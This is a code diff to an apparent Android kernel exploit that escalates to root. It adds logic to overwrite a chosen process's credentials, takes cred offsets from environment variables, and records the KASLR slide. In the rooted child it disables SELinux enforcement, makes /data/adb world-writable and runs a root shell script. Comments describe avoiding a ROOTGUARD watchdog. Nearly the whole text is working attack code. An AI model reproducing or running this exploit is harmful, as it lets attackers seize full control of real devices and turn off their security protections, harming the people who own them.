@@ -534,6 +534,26 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
         pr_info("SWAP_HOLD: spray live fake_fops=%016zx pid=%d — not exiting\n",
                 fake_fops, getpid());
         durable_stage("swap_hold");
+        {
+          char mb[256];
+          int mn = snprintf(
+              mb, sizeof(mb),
+              "why=hold slide=0x%llx fake_fops=0x%zx pid=%d success=%d\n",
+              (unsigned long long)kaslr_slide, fake_fops, (int)getpid(),
+              atomic_load(&consumer_success));
+          const char *mpaths[] = {"/data/local/tmp/swap_meta.txt",
+                                  "/sdcard/ghostlock/aarif/swap_meta.txt"};
+          for (size_t mi = 0; mi < sizeof(mpaths) / sizeof(mpaths[0]); mi++) {
+            int mf = open(mpaths[mi], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC,
+                          0644);
+            if (mf >= 0) {
+              if (mn > 0)
+                (void)write(mf, mb, (size_t)mn);
+              close(mf);
+            }
+          }
+          pr_info("SWAP_META %s", mb);
+        }
         fflush(stdout);
         fsync(STDOUT_FILENO);
         for (;;)
@@ -1670,11 +1690,42 @@ static uintptr_t perf_find_task(void) { return perf_find_task_pid(0); }
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
+static uint32_t child_self_status_uid(void) {
+  int fd = open("/proc/self/status", O_RDONLY);
+  if (fd < 0)
+    return 9999;
+  char buf[512] = {0};
+  (void)read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  char *p = strstr(buf, "Uid:");
+  if (!p)
+    return 9999;
+  unsigned v = 9999;
+  if (sscanf(p, "Uid: %u", &v) != 1)
+    return 9999;
+  return v;
+}
+
+static int child_seen_root(void) {
+  return getuid() == 0 || geteuid() == 0 || child_self_status_uid() == 0;
+}
+
+static int child_go_file(void) {
+  return access("/data/local/tmp/uid0_go", F_OK) == 0;
+}
+
 static void child_spin_until_cmd(int cmd_r, char *cmd) {
   struct pollfd pfd;
   pfd.fd = cmd_r;
   pfd.events = POLLIN;
   for (;;) {
+    /* Z33: /proc/status Uid 0 while getuid() stayed 2000; pipe C never
+     * answered. Auto-G on status/euid or a go-file so payload does not
+     * wait on a clobbered fd. */
+    if (child_seen_root() || child_go_file()) {
+      *cmd = 'G';
+      return;
+    }
     pfd.revents = 0;
     if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
       if (read(cmd_r, cmd, 1) == 1)
@@ -1682,8 +1733,6 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
     }
     syscall(__NR_getpid);
     {
-      /* uid beacon (fd-free detection): the C-pipe answer path never
-       * worked in this codebase; the file always does. */
       static int bf = -2;
       if (bf == -2)
         bf = open("/data/local/tmp/child_uid.txt", O_WRONLY | O_CREAT |
@@ -1721,16 +1770,38 @@ static void child_main(struct child_pipes *p) {
     child_spin_until_cmd(p->cmd_r, &cmd);
   }
   close(p->cmd_r); close(p->uid_w);
-  if (getuid() != 0) _exit(1);
+  /* Z33: status Uid 0 is enough — getuid() can stay 2000 (real_cred vs cred). */
+  if (!child_seen_root())
+    _exit(1);
+  {
+    int pf = open("/data/local/tmp/ROOTED", O_WRONLY | O_CREAT | O_TRUNC, 0666);
+    if (pf >= 0) {
+      char ib[96];
+      int n = snprintf(ib, sizeof(ib), "uid=%u euid=%u status=%u\n",
+                       (unsigned)getuid(), (unsigned)geteuid(),
+                       (unsigned)child_self_status_uid());
+      if (n > 0)
+        (void)write(pf, ib, (size_t)n);
+      close(pf);
+      chmod("/data/local/tmp/ROOTED", 0666);
+    }
+  }
   pid_t gc = fork();
   if (gc == 0) {
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
     if (efd >= 0) { write(efd, "0", 1); close(efd); }
+    umask(0);
+    mkdir("/data/adb", 0777);
+    mkdir("/data/adb/ksu", 0777);
+    chmod("/data/adb", 0777);
     execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
-    /* fallback if the script is missing: minimal durable proof */
     execl("/system/bin/sh", "sh", "-c",
           "id > /data/local/tmp/ROOTED_ID.txt 2>&1; "
-          "setenforce 0; mkdir -p /data/adb/ksu; chmod 777 /data/adb",
+          "id > /data/adb/uid0_id.txt 2>&1; "
+          "chmod 666 /data/local/tmp/ROOTED /data/local/tmp/ROOTED_ID.txt "
+          "/data/local/tmp/uid0_id.txt 2>/dev/null; "
+          "mkdir -p /data/adb/ksu; chmod 777 /data/adb /data/adb/ksu; "
+          "echo 0 > /sys/fs/selinux/enforce",
           (char *)NULL);
     _exit(1);
   }
@@ -2189,7 +2260,14 @@ uid0_cred_punch:;
    * (ffffff87/88/89) self-punches missed 3/3 today (CapEff stayed 0);
    * the child punch hit (overnight 26225: child_status=0). Self only if
    * P0; else child raw (high alias is fine for the child). */
-  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4 &&
+  if (env_flag("UID0_PREFER_CHILD", 0) && task_ptr_ok(lch.x28) &&
+      lch.x28_cnt >= 4) {
+    /* Z33: parent stays 2000 so ROOTGUARD does not SIGKILL pselect.
+     * High-alias child is allowed (do not wrap to P0). Slot +0x780. */
+    use_task = lch.x28;
+    ucnt = lch.x28_cnt;
+    who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
+  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4 &&
       p0_dram_ptr(lself.x28)) {
     use_task = lself.x28;
     ucnt = lself.x28_cnt;
@@ -2235,7 +2313,16 @@ uid0_cred_punch:;
       memset(&lch, 0, sizeof(lch));
       perf_collect(0, &lself);
       perf_collect((int)child, &lch);
-      if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
+      if (env_flag("UID0_PREFER_CHILD", 0) && task_ptr_ok(lch.x28) &&
+          lch.x28_cnt >= 4) {
+        use_task = lch.x28;
+        ucnt = lch.x28_cnt;
+        who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
+        pr_info("UID0 HOLD leak child_x28=%016zx/%d who=%s — cred now\n",
+                use_task, ucnt, who);
+        live_sync_log("UID0", "hold_leak_child");
+        break;
+      } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
         use_task = lself.x28;
         ucnt = lself.x28_cnt;
         who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
@@ -2243,8 +2330,7 @@ uid0_cred_punch:;
                 ucnt);
         live_sync_log("UID0", "hold_leak_self");
         break;
-      }
-      if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
+      } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
         use_task = lch.x28;
         ucnt = lch.x28_cnt;
         who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
@@ -2296,12 +2382,17 @@ uid0_cred_punch:;
     g_uid0_slot_idx = 0;
     g_uid0_task_base = use_task;
     g_uid0_check_self = (who[0] == 's');
-    uintptr_t slot = use_task +
-        (env_flag("UID0_COMM_CANARY", 0) ? 0x790
-                                         : g_uid0_slot_candidates[0]);
-    uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
-                          ? "child_comm_canary"
-                          : (self ? "self_cred" : "child_cred"));
+    {
+      uint64_t cred_off = g_uid0_slot_candidates[0];
+      const char *slot_env = getenv("UID0_SLOT");
+      if (slot_env && slot_env[0])
+        cred_off = strtoull(slot_env, NULL, 0);
+      uintptr_t slot = use_task +
+          (env_flag("UID0_COMM_CANARY", 0) ? 0x790 : cred_off);
+      uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
+                            ? "child_comm_canary"
+                            : (self ? "self_cred" : "child_cred"));
+    }
     uid0_kill_watchers(watch, nw);
     nw = uid0_scan_watchers(watch, 32);
     uid0_kill_watchers(watch, nw);
@@ -2438,6 +2529,13 @@ uid0_cred_punch:;
       close(pipes.cmd_w);
       close(pipes.uid_r);
     } else {
+      /* Child-only WIN (Z33): pipe may be dead. File is the command. */
+      int gf = open("/data/local/tmp/uid0_go", O_WRONLY | O_CREAT | O_TRUNC,
+                    0666);
+      if (gf >= 0) {
+        (void)write(gf, "G", 1);
+        close(gf);
+      }
       write(pipes.cmd_w, "G", 1);
       close(pipes.cmd_w);
       close(pipes.uid_r);
@@ -2858,8 +2956,17 @@ int run_exploit(int argc, char **argv) {
   if (env_flag("MODE4_SLIDE", 0) || env_flag("MODE4_SLIDE_ZERO", 0) ||
       env_flag("MODE4_SLIDE_VERIFY", 0) ||
       env_flag("MODE4_SLIDE_SWAP", 0) ||
-      env_flag("MODE4_ROOT", 0)) {
-    if (env_flag("MODE4_ROOT", 0)) setenv("MODE4_SLIDE", "1", 1);
+      env_flag("MODE4_ROOT", 0) ||
+      env_flag("UID0_DIRECT", 0)) {
+    if (env_flag("MODE4_ROOT", 0)) {
+      setenv("MODE4_SLIDE", "1", 1);
+      /* Phase-1 stamp is already SLIDE NOSPRAY (init_task BSS lock).
+       * Spraying here burns the only P0 mm page; phase-2 swap then
+       * sees only ffffff89 KS leaks and never plants fake_fops.
+       * Do not set MODE4_SLIDE_SPRAY. */
+      setenv("MODE4_SWAP_NOCFI", "1", 0);
+      setenv("MODE4_SWAP_HOLD", "1", 0);
+    }
     setenv("MODE4_WRITE_PROOF", "1", 0); /* stamp chain gate */
   }
   if (write_proof && umh_available && !force_w1) {
@@ -3132,6 +3239,26 @@ int run_exploit(int argc, char **argv) {
         kaslr_base = (uint64_t)KIMAGE_TEXT_BASE + rslide;
         kaslr_done = 1;
         pr_success("ROOT: slide=%016llx\n", (unsigned long long)rslide);
+        {
+          char mb[192];
+          int mn = snprintf(mb, sizeof(mb),
+                            "why=slide slide=0x%llx fake_fops=0 pid=0 success=0\n",
+                            (unsigned long long)rslide);
+          int mf = open("/data/local/tmp/swap_meta.txt",
+                        O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+          if (mf >= 0) {
+            if (mn > 0)
+              (void)write(mf, mb, (size_t)mn);
+            close(mf);
+          }
+          mf = open("/sdcard/ghostlock/aarif/swap_meta.txt",
+                    O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+          if (mf >= 0) {
+            if (mn > 0)
+              (void)write(mf, mb, (size_t)mn);
+            close(mf);
+          }
+        }
         unsetenv("MODE4_SLIDE");
         unsetenv("MODE4_SLIDE_ZERO");
         unsetenv("MODE4_SLIDE_VERIFY");
